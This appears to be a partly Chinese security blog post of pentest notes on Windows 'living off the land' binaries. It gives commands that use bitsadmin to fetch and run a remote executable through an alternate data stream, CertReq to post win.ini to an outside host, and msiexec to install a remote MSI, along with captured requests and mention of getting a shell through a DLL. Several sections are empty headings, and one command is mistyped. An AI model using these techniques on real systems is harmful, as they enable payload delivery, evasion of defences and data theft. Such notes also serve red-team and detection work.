---
layout:     post
title:      Living Off The Land
date:       2020-11-26 01:47:05 +0800
categories: Security
tags:       Download Pentest
author:     SteveDevin
mathjax:    true
---
* content
{:toc}

最近做白利用改进专项, 记录一下



## Download

### 1. Bitsadmin.exe

```powershell
bitsadmin /create myfile
bitsadmin /addfile myfile http://192.168.220.125/white_process/call_calc.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile
```

[***pcap***](/assets/pcap/Bitsadmin.pcap)

```http
GET /white_process/call_calc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
If-Unmodified-Since: Wed, 25 Nov 2020 16:46:48 GMT
Range: bytes=0-71744
User-Agent: Microsoft BITS/7.8
Host: 192.168.220.125
```

### 2. CertReq.exe

```powershell
CertReq -Post -config https://example.org/ c:\windows\win.ini
```

[***pcap***](/assets/pcap/CertReq.pcap)

```http
POST /white_process/test HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.18362.1/19h1_release)
Content-Length: 167
Host: 192.168.220.125
```

***Note***: Small files only

*Due to something going on with the internals of CertReq.exe only small (not sure on specific size limitations) files appear to work - otherwise you get the below error!*

### 3. Certutil.exe


### 4. Desktopimgdownldr.exe

### 5. Diantz.exe

### 6. Esentutl.exe

### 7. Msiexec.exe

```powershell
bmsiexec /i http://192.168.220.125/white_process/test.msi
```

[***pcap***](/assets/pcap/Msiexec.pcap)

***Note***: whitch function Msiexec.exe call: *DllRegisterServer*
之前按照 `Micro8` 的过程复现, 发现一直有问题, 后来wsy提醒说, Msiexec 调用的dll的 `DllRegisterServer`, 而`Micro8`中的方法生成的dll导出表仅有 `DllEntryPoint`

后面逆向了一下 32位版的 msiexec.exe, 也通过 `rundll32 Msiexec_rev_x64_4444.dll DllEntryPoint` 成功 get shell 证实了这一结论

![msiexec_re_register_dll](/assets/img/Msiexec_DllRegisterServer.png)

## Reference

1. [lolbas/#download](https://lolbas-project.github.io/#/download)
2. [Exe_ADS_Methods.txt](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

### download

#### certreq

1. [dtm.uk](https://dtm.uk/certreq/)

#### Msiexec

1. [3gstudent])(https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/)
2. [Micro8](https://www.bookstack.cn/read/Micro8/Chapter1-81-90-86_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.md)
